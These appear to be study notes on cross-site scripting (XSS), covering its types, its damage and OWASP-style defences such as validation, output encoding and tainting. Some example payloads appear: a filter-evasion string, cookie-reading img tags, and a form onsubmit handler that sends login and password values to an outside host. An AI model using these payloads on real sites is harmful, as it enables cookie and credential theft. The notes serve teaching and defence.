# what is XSS
        An XSS vulnerability is present when an attacker can
        inject scripting code into pages generated by a web
        application

# Methods for injection malicious code :
        -Reflected XSS
            the attack script is reflected back to the user as part of a page from the victim site "inject malicious script into its server"
        
        -Stored XSS
            the attacker stores the malicious code in a ressource managed by the web application such as a database
            we can use images 

        Others , such as DOM based attacks

# Damage Caused by XSS:
        Stealing informations:

        spoofing requests:

        web defacing :
            change the contant of a page 

        system compromise :
            exploiting vuln through the code injection

        
# How to Protect Yourself (OWASP)
        • The best way to protect against XSS attacks:
            – Validate all headers, cookies, query strings, form fields, and hidden
            fields against a rigorous specification of what should be allowed.
            
            – Do not attempt to identify active content and remove, filter, or sanitize
            it. There are too many types of active content and too many ways of
            encoding it to get around filters for such content.
            
            – Adopt a ‘positive’ security policy that specifies what is allowed.
            ‘Negative’ or attack signature based policies are difficult to maintain
            and are likely to be incomplete. 


# Input data validation and filtering
        • Never trust client-side data
            – Best: allow only what you expect
        
        • Remove/encode special characters
            – Many encodings, special chars!
            – E.g., long (non-standard) UTF-8 encodings
        
# Output filtering / encoding
        • Remove / encode (X)HTML special chars
            – &lt; for <, &gt; for >, &quot for “ …
        
        • Allow only safe commands (e.g., no <script>…)
        
        • Caution: `filter evasion` tricks
            – See XSS Cheat Sheet for filter evasion
            – E.g., if filter allows quoting (of <script> etc.), use
            malformed quoting: <IMG “””><SCRIPT>alert(“XSS”)…
            – Or: (long) UTF-8 encode, or…
        
        • Caution: Scripts not only in <script>!
            – Examples in a few slides

# !!!Caution: Scripts not only in <script>!
        • JavaScript as scheme in URI
            – <img src=“javascript:alert(document.cookie);”>
        • JavaScript On{event} attributes (handlers)
            – OnSubmit, OnError, OnLoad, …
        • Typical use:
            – <img src=“none” OnError=“alert(document.cookie)”>
            – <iframe src=`https://bank.com/login` onload=`steal()`>
            – <form> action="logon.jsp" method="post" onsubmit="hackImg=new Image;
                hackImg.src='http://www.digicrime.com/'+document.for
                ms(1).login.value'+':'+
                document.forms(1).password.value;" </form>

# Advanced anti-XSS tools
        • Dynamic Data Tainting
            – Perl taint mode
        • Static Analysis
            – Analyze Java, PHP to determine possible flow of
            untrusted input
                    
# Client-side XSS defenses
        – Proxy-based: analyze the HTTP traffic exchanged between
            user’s web browser and the target web server by scanning
            for special HTML characters and encoding them before
            executing the page on the user’s web browser
        – Application-level firewall: analyze browsed HTML pages for
            hyperlinks that might lead to leakage of sensitive
            information and stop bad requests using a set of
            connection rules.
        – Auditing system: monitor execution of JavaScript code and
            compare the operations against high-level policies to
            detect malicious behavior
